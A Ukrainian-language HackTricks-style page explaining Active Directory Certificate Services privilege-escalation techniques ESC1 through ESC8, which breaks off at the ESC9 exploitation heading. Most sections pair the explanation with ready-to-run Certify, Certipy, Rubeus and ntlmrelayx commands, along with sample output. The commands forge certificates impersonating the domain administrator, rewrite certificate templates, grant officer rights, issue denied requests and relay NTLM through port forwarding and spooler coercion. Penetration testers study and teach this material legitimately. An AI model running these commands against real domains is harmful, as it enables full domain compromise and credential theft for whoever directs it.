# Підвищення привілеїв у домені AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Це короткий огляд розділів про техніки підвищення привілеїв із таких публікацій:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів — ESC1

### Пояснення

### Пояснення ESC1: неправильно налаштовані шаблони сертифікатів

- **Enterprise CA надає користувачам із низькими привілеями права на реєстрацію сертифікатів.**
- **Погодження менеджера не потрібне.**
- **Підписи авторизованих співробітників не потрібні.**
- **Дескриптори безпеки шаблонів сертифікатів мають надто дозвільні налаштування, що дозволяє користувачам із низькими привілеями отримувати права на реєстрацію сертифікатів.**
- **Шаблони сертифікатів налаштовані так, щоб визначати EKU, які спрощують автентифікацію:**
- До них належать ідентифікатори Extended Key Usage (EKU), такі як Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) або відсутність EKU (SubCA).
- **Шаблон дозволяє запитувачам додавати subjectAltName до Certificate Signing Request (CSR):**
- Active Directory (AD) надає пріоритет subjectAltName (SAN) у сертифікаті під час перевірки ідентичності, якщо він присутній. Це означає, що, вказавши SAN у CSR, можна запросити сертифікат для видачі себе за будь-якого користувача (наприклад, адміністратора домену). Можливість вказувати SAN запитувачем визначається в об’єкті AD шаблону сертифіката через властивість `mspki-certificate-name-flag`. Ця властивість є бітовою маскою, і наявність прапора `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказувати SAN.

> [!CAUTION]
> Описана конфігурація дозволяє користувачам із низькими привілеями запитувати сертифікати з будь-яким SAN на вибір, забезпечуючи автентифікацію від імені будь-якого принципала домену через Kerberos або SChannel.

Цю функцію іноді вмикають для підтримки динамічного створення HTTPS-сертифікатів або сертифікатів хостів продуктами чи службами розгортання, а також через недостатнє розуміння її призначення.

Зазначається, що створення сертифіката з цією опцією викликає попередження. Однак цього не відбувається, коли наявний шаблон сертифіката (наприклад, шаблон `WebServer`, у якому ввімкнено `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюють, а потім змінюють, додаючи OID автентифікації.<sup>[[6]](#references)</sup>

### Зловживання

Щоб **знайти вразливі шаблони сертифікатів**, можна виконати:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Щоб **зловжити цією вразливістю для видавання себе за адміністратора**, можна виконати:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Потім ви можете перетворити згенерований **сертифікат у формат `.pfx`** і знову використати його для **автентифікації за допомогою Rubeus або certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Бінарні файли Windows "Certreq.exe" і "Certutil.exe" можна використовувати для створення PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перелік шаблонів сертифікатів у схемі конфігурації лісу AD, зокрема тих, що не вимагають схвалення або підписів, мають EKU Client Authentication або Smart Card Logon і для яких увімкнено прапорець `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна виконати за допомогою такого LDAP-запиту:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Неправильно налаштовані Certificate Templates - ESC2

### Пояснення

Другий сценарій зловживання є варіацією першого:

1. Права на enrollment надаються користувачам із низькими привілеями Enterprise CA.
2. Вимогу щодо схвалення менеджером вимкнено.
3. Необхідність авторизованих підписів не передбачена.
4. Надто дозвільний security descriptor у certificate template надає користувачам із низькими привілеями права на enrollment сертифікатів.
5. **Certificate template визначено так, щоб він містив Any Purpose EKU або не містив EKU.**

**Any Purpose EKU** дає змогу attacker отримати сертифікат для **будь-якої мети**, зокрема для client authentication, server authentication, code signing тощо. Для exploitation цього сценарію можна застосувати ту саму **technique, що використовується для ESC3**.

Сертифікати **без EKU**, які функціонують як subordinate CA certificates, можна використати для **будь-якої мети**, а **також для підписання нових сертифікатів**. Отже, attacker може вказати довільні EKU або поля в нових сертифікатах, використовуючи subordinate CA certificate.

Однак нові сертифікати, створені для **domain authentication**, не працюватимуть, якщо subordinate CA не має довіри з боку об’єкта **`NTAuthCertificates`**, що є налаштуванням за замовчуванням. Водночас attacker все ще може створювати **нові сертифікати з будь-яким EKU** та довільними значеннями сертифіката. Потенційно їх можна **використати** для широкого спектра цілей (наприклад, code signing, server authentication тощо), і це може мати значні наслідки для інших застосунків у мережі, таких як SAML, AD FS або IPSec.<sup>[[6]](#references)</sup>

Щоб перелічити templates, які відповідають цьому сценарію в configuration schema AD Forest, можна виконати такий LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Неправильно налаштовані шаблони агента реєстрації - ESC3

### Пояснення

Цей сценарій подібний до першого та другого, але **зловживає** **іншим EKU** (Certificate Request Agent) і **2 різними шаблонами** (тому він має 2 набори вимог),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), відомий у документації Microsoft як **Enrollment Agent**, дозволяє суб'єкту **отримувати** **сертифікат** **від імені іншого користувача**.

**«Агент реєстрації»** отримує такий **сертифікат** за цим **шаблоном** і використовує отриманий **сертифікат для співпідписання CSR від імені іншого користувача**. Потім він **надсилає** **підписаний обома сторонами CSR** до CA, отримуючи сертифікат за **шаблоном**, який **дозволяє «отримання від імені іншого користувача»**, а CA відповідає **сертифікатом, що належить «іншому» користувачеві**.<sup>[[6]](#references)</sup>

**Вимоги 1:**

- Enterprise CA надає користувачам із низькими привілеями права на отримання сертифікатів.
- Вимогу щодо схвалення менеджером не встановлено.
- Вимога щодо авторизованих підписів відсутня.
- Дескриптор безпеки шаблону сертифіката є надмірно дозвільним і надає користувачам із низькими привілеями права на отримання сертифікатів.
- Шаблон сертифіката містить Certificate Request Agent EKU, що дає змогу запитувати інші шаблони сертифікатів від імені інших суб'єктів.

**Вимоги 2:**

- Enterprise CA надає користувачам із низькими привілеями права на отримання сертифікатів.
- Схвалення менеджером обходиться.
- Версія схеми шаблону дорівнює 1 або перевищує 2, а також у ньому вказано вимогу Application Policy Issuance Requirement, яка потребує Certificate Request Agent EKU.
- EKU, визначений у шаблоні сертифіката, дозволяє автентифікацію в домені.
- На CA не застосовуються обмеження для агентів реєстрації.

### Експлуатація

Для експлуатації цього сценарію можна використовувати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy):<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Керівники підприємства CA можуть обмежувати **users**, яким дозволено **obtain** **enrollment agent certificate**, шаблони, у яких **agents** можуть виконувати enrollment, а також **accounts**, від імені яких enrollment agent може діяти. Це виконується шляхом відкриття `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, а потім переходу на вкладку “Enrollment Agents”.

Однак зазначається, що **default** налаштуванням для CA є “**Do not restrict enrollment agents**.” Коли адміністратори вмикають обмеження для enrollment agents, встановлюючи його на “Restrict enrollment agents”, конфігурація за замовчуванням усе одно залишається надзвичайно дозвільною. Вона дозволяє **Everyone** виконувати enrollment у всіх шаблонах від імені будь-якого користувача.

## Керування доступом до вразливих шаблонів сертифікатів - ESC4

### **Пояснення**

**security descriptor** на **certificate templates** визначає **permissions**, які мають конкретні **AD principals** щодо шаблону.

Якщо **attacker** має необхідні **permissions**, щоб **alter** **template** та **institute** будь-які **exploitable misconfigurations**, описані в **prior sections**, це може сприяти privilege escalation.

Важливі permissions, що застосовуються до шаблонів сертифікатів:<sup>[[6]](#references)</sup>

- **Owner:** Надає неявний контроль над об’єктом, дозволяючи змінювати будь-які атрибути.
- **FullControl:** Надає повні повноваження над об’єктом, зокрема можливість змінювати будь-які атрибути.
- **WriteOwner:** Дозволяє змінити власника об’єкта на principal під контролем attacker.
- **WriteDacl:** Дозволяє змінювати елементи керування доступом, потенційно надаючи attacker FullControl.
- **WriteProperty:** Дозволяє редагувати будь-які властивості об’єкта.

### Abuse

Щоб визначити principals із правами редагування шаблонів та інших PKI-об’єктів, виконайте enumeration за допомогою Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Приклад privesc, як і попередній:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 — це коли користувач має права запису для шаблону сертифіката. Наприклад, цим можна зловживати, перезаписавши конфігурацію шаблону сертифіката, щоб зробити шаблон вразливим до ESC1.

Як видно з наведеної вище схеми, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` має нове ребро `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов’язана із сертифікатами, я також реалізував цю атаку, яка відома як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ось невеликий sneak peek команди `shadow auto` у Certipy для отримання NT-хеша жертви.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. **За замовчуванням** Certipy **перезапише** конфігурацію, щоб зробити її **вразливою до ESC1**. Ми також можемо вказати **`-save-old` параметр, щоб зберегти стару конфігурацію**, що буде корисно для **відновлення** конфігурації після нашої атаки.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Контроль доступу до вразливих об'єктів PKI - ESC5

### Пояснення

Розгалужена мережа взаємопов'язаних зв'язків на основі ACL, яка охоплює кілька об'єктів, окрім шаблонів сертифікатів і центру сертифікації, може впливати на безпеку всієї системи AD CS. До цих об'єктів, які можуть суттєво впливати на безпеку, належать:

- Об'єкт комп'ютера CA-сервера в AD, який може бути скомпрометований за допомогою таких механізмів, як S4U2Self або S4U2Proxy.
- RPC/DCOM-сервер CA-сервера.
- Будь-який дочірній об'єкт AD або контейнер у визначеному шляху контейнера `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях містить, зокрема, такі контейнери й об'єкти, як контейнер Certificate Templates, контейнер Certification Authorities, об'єкт NTAuthCertificates і контейнер Enrollment Services.

Безпека системи PKI може бути скомпрометована, якщо attacker із низькими привілеями зможе отримати контроль над будь-яким із цих критично важливих компонентів.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

У публікації [**CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) також розглядається вплив прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, описаний Microsoft. Якщо цю конфігурацію активовано на Certification Authority (CA), вона дозволяє додавати **значення, визначені користувачем**, до **subject alternative name** для **будь-якого запиту**, зокрема створеного на основі Active Directory®. У результаті ця можливість дає **intruder** змогу виконати enrollment через **будь-який шаблон**, налаштований для **автентифікації** домену, зокрема через ті, що дозволяють enrollment **непривілейованим** користувачам, як-от стандартний шаблон User. Таким чином, можна отримати сертифікат, який дає змогу intruder автентифікуватися як адміністратор домену або **будь-яка інша активна сутність** у домені.<sup>[[9]](#references)</sup>

**Примітка**: Спосіб додавання **альтернативних імен** до Certificate Signing Request (CSR) за допомогою аргументу `-attrib "SAN:"` у `certreq.exe` (який називають «Name Value Pairs») відрізняється від стратегії exploitation SAN в ESC1. Відмінність полягає в тому, **як інкапсулюється інформація про обліковий запис** — в атрибуті сертифіката, а не в extension.

### Експлуатація

Щоб перевірити, чи активовано цей параметр, організації можуть використати таку команду з `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ця операція по суті використовує **віддалений доступ до реєстру**, отже, альтернативним підходом може бути:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Інструменти на кшталт [**Certify**](https://github.com/GhostPack/Certify) і [**Certipy**](https://github.com/ly4k/Certipy) здатні виявляти цю помилкову конфігурацію та експлуатувати її:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Щоб змінити ці налаштування, за умови наявності прав **domain administrative** або еквівалентних, наведену нижче команду можна виконати з будь-якої робочої станції:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Після оновлень безпеки за травень 2022 року нововидані **сертифікати** міститимуть **розширення безпеки**, яке включає властивість `objectSid` **запитувача**. Для ESC1 цей SID визначається на основі вказаного SAN. Однак для **ESC6** SID відповідає `objectSid` **запитувача**, а не SAN.\
> Для експлуатації ESC6 необхідно, щоб система була вразливою до ESC10 (Weak Certificate Mappings), який надає пріоритет **SAN, а не новому розширенню безпеки**.

## Контроль доступу до вразливого Certificate Authority - ESC7

### Attack 1

#### Пояснення

Контроль доступу до Certificate Authority забезпечується набором дозволів, які регулюють дії CA. Ці дозволи можна переглянути, відкривши `certsrv.msc`, клацнувши правою кнопкою миші потрібний CA, вибравши властивості та перейшовши на вкладку Security. Крім того, дозволи можна перерахувати за допомогою модуля PSPKI, використовуючи такі команди:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Це дає уявлення про основні права, а саме **`ManageCA`** і **`ManageCertificates`**, які відповідають ролям «адміністратор CA» і «Менеджер сертифікатів» відповідно.<sup>[[6]](#references)</sup>

#### Зловживання

Наявність прав **`ManageCA`** на центр сертифікації дає принципалу змогу віддалено змінювати налаштування за допомогою PSPKI. Це включає перемикання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, щоб дозволити вказування SAN у будь-якому шаблоні, що є критично важливим аспектом domain escalation.

Спрощення цього процесу можливе за допомогою cmdlet **Enable-PolicyModuleFlag** у PSPKI, що дає змогу вносити зміни без безпосередньої взаємодії з GUI.

Наявність прав **`ManageCertificates`** полегшує схвалення запитів, що очікують на розгляд, фактично обходячи захист «схвалення сертифіката менеджером CA».

Комбінацію модулів **Certify** і **PSPKI** можна використовувати для запиту, схвалення та завантаження сертифіката:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Атака 2

#### Пояснення

> [!WARNING]
> У **попередній атаці** дозволи **`Manage CA`** використовувалися для **ввімкнення** прапорця **EDITF_ATTRIBUTESUBJECTALTNAME2** для виконання **атаки ESC6**, але це не матиме жодного ефекту, доки службу CA (`CertSvc`) не буде перезапущено. Коли користувач має право доступу **`Manage CA`**, йому також дозволено **перезапускати службу**. Однак це **не означає, що користувач може віддалено перезапустити службу**. Крім того, E**SC6 може не працювати одразу** у більшості пропатчених середовищ через оновлення безпеки за травень 2022 року.

Тому тут представлено іншу атаку.

Передумови:

- Лише дозвіл **`ManageCA`**
- Дозвіл **`Manage Certificates`** (можна надати з **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** має бути **ввімкнено** (можна ввімкнути з **`ManageCA`**)

Техніка ґрунтується на тому, що користувачі з правами доступу `Manage CA` _і_ `Manage Certificates` можуть **видавати невдалі запити на сертифікати**. Шаблон сертифіката **`SubCA`** є **вразливим до ESC1**, але лише **адміністратори** можуть реєструватися в цьому шаблоні. Таким чином, **користувач** може **подати запит** на реєстрацію в **`SubCA`** — цей запит буде **відхилено**, — але **згодом його видасть менеджер**.<sup>[[6]](#references)</sup>

#### Зловживання

Ви можете **надати собі** право доступу **`Manage Certificates`**, додавши свого користувача як нового відповідального.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Шаблон **`SubCA`** можна **увімкнути на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон `SubCA` увімкнено.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Якщо ми виконали попередні умови для цієї атаки, можемо почати з **запиту сертифіката на основі шаблону `SubCA`**.

**У цьому запиті буде відмовлено**, але ми збережемо приватний ключ і занотуємо ID запиту.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Маючи **`Manage CA` і `Manage Certificates`**, ми можемо **видати невдалий запит на сертифікат** за допомогою команди `ca` і параметра `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` і параметра `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Атака 3 – Зловживання розширенням Manage Certificates (SetExtension)

#### Пояснення

На додаток до класичних зловживань ESC7 (увімкнення атрибутів EDITF або схвалення запитів, що очікують), **Certify 2.0** виявив абсолютно новий примітив, для якого потрібна лише роль *Manage Certificates* (також відома як **Certificate Manager / Officer**) на Enterprise CA.<sup>[[3]](#references)</sup>

Метод RPC `ICertAdmin::SetExtension` може виконувати будь-який principal, який має *Manage Certificates*. Традиційно цей метод використовувався легітимними CA для оновлення розширень у **pending**-запитах, але attacker може зловжити ним, щоб **додати *non-default* certificate extension** (наприклад, власний OID *Certificate Issuance Policy*, такий як `1.1.1.1`) до запиту, що очікує схвалення.

Оскільки цільовий шаблон **не визначає значення за замовчуванням для цього розширення**, CA НЕ перезапише контрольоване attacker значення, коли запит зрештою буде виданий. Отриманий сертифікат, таким чином, міститиме обране attacker розширення, яке може:

* Відповідати вимогам Application / Issuance Policy інших вразливих шаблонів (що призводить до privilege escalation).
* Додавати EKU або policy, які надають сертифікату несподіваний рівень довіри в сторонніх системах.

Коротко кажучи, *Manage Certificates* — раніше вважане «менш потужною» половиною ESC7 — тепер можна використати для повного privilege escalation або довготривалої persistence без зміни конфігурації CA та без необхідності мати більш обмежене право *Manage CA*.

#### Зловживання примітивом за допомогою Certify 2.0

1. **Надішліть certificate request, який залишиться *pending*.**  Цього можна досягти за допомогою шаблону, що вимагає схвалення manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Додайте custom extension до pending-запиту** за допомогою нової команди `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Якщо шаблон уже не визначає розширення *Certificate Issuance Policies*, наведене значення буде збережене після видачі.*

3. **Видайте запит** (якщо ваша роль також має права схвалення *Manage Certificates*) або дочекайтеся, поки operator його схвалить. Після видачі завантажте сертифікат:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Отриманий сертифікат тепер містить malicious issuance-policy OID і може використовуватися в подальших атаках (наприклад, ESC13, domain escalation тощо).

> ПРИМІТКА:  Ту саму атаку можна виконати за допомогою Certipy ≥ 4.7 через команду `ca` та параметр `-set-extension`.

## NTLM Relay до HTTP Endpoints AD CS – ESC8

### Пояснення

> [!TIP]
> У середовищах, де **AD CS інстальовано**, якщо існує **web enrollment endpoint, вразливий** до атак, і опубліковано щонайменше один **certificate template**, який дозволяє **domain computer enrollment та client authentication** (наприклад, стандартний шаблон **`Machine`**), **будь-який computer з активною spooler service може бути скомпрометований attacker**!

AD CS підтримує кілька **HTTP-based enrollment methods**, доступних через додаткові server roles, які адміністратори можуть інсталювати. Ці інтерфейси для HTTP-based certificate enrollment вразливі до **NTLM relay attacks**. Attacker із **compromised machine може видати себе за будь-який AD account, який автентифікується через inbound NTLM**. Видаючи себе за victim account, attacker може отримати доступ до цих web-інтерфейсів і **запросити client authentication certificate за допомогою certificate templates `User` або `Machine`**.

- **Web enrollment interface** (старий ASP application, доступний за адресою `http://<caserver>/certsrv/`) за замовчуванням використовує лише HTTP, що не забезпечує захисту від NTLM relay attacks. Крім того, він явно дозволяє лише NTLM authentication через свій Authorization HTTP header, тому безпечніші authentication methods, такі як Kerberos, непридатні.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service і **Network Device Enrollment Service** (NDES) за замовчуванням підтримують negotiate authentication через свій Authorization HTTP header. Negotiate authentication **підтримує і Kerberos, і NTLM**, що дозволяє attacker **downgrade до NTLM** authentication під час relay attacks. Хоча ці web services за замовчуванням використовують HTTPS, самого HTTPS **недостатньо для захисту від NTLM relay attacks**. Захист HTTPS services від NTLM relay attacks можливий лише тоді, коли HTTPS поєднано з channel binding. На жаль, AD CS не активує Extended Protection for Authentication в IIS, що необхідно для channel binding.<sup>[[6]](#references)</sup>

Поширеною **проблемою** NTLM relay attacks є **коротка тривалість NTLM sessions** і неможливість attacker взаємодіяти із services, які **вимагають NTLM signing**.

Однак це обмеження можна подолати, використавши NTLM relay attack для отримання сертифіката користувача, оскільки тривалість session визначається періодом дії сертифіката, а сам сертифікат можна використовувати із services, які **вимагають NTLM signing**. Інструкції щодо використання викраденого сертифіката наведено тут:


{{#ref}}
account-persistence.md
{{#endref}}

Іншим обмеженням NTLM relay attacks є те, що **victim account має автентифікуватися на attacker-controlled machine**. Attacker може або зачекати, або спробувати **примусити** цю authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Зловживання**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` перераховує **enabled HTTP AD CS endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними Certificate Authorities (CA) для зберігання кінцевих точок Certificate Enrollment Service (CES). Ці кінцеві точки можна розібрати та перелічити за допомогою інструмента **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання за допомогою Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Зловживання за допомогою [Certipy](https://github.com/ly4k/Certipy)

Certipy за замовчуванням виконує запит сертифіката на основі шаблону `Machine` або `User`, що визначається тим, чи закінчується ім’я облікового запису, автентифікацію якого ретранслюють, на `$`. Вказати альтернативний шаблон можна за допомогою параметра `-template`.

Після цього для примусової автентифікації можна застосувати техніку на кшталт [PetitPotam](https://github.com/ly4k/PetitPotam). У разі роботи з контролерами домену необхідно вказати `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Нове значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, яке позначається як ESC9, запобігає вбудовуванню **нового розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`** у сертифікат. Цей прапорець стає важливим, коли **`StrongCertificateBindingEnforcement`** має значення `1` (налаштування за замовчуванням), на відміну від значення `2`. Його важливість зростає у сценаріях, де може бути використано слабше зіставлення сертифіката для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінювала б вимог.<sup>[[7]](#references)</sup>

Умови, за яких встановлення цього прапорця стає суттєвим:

- **`StrongCertificateBindingEnforcement`** не змінено на `2` (значення за замовчуванням — `1`), або **`CertificateMappingMethods`** містить прапорець `UPN`.
- Сертифікат позначено прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у налаштуванні `msPKI-Enrollment-Flag`.
- Сертифікат містить будь-який EKU для автентифікації клієнта.
- Наявні дозволи `GenericWrite` для будь-якого облікового запису, щоб скомпрометувати інший.

### Сценарій експлуатації

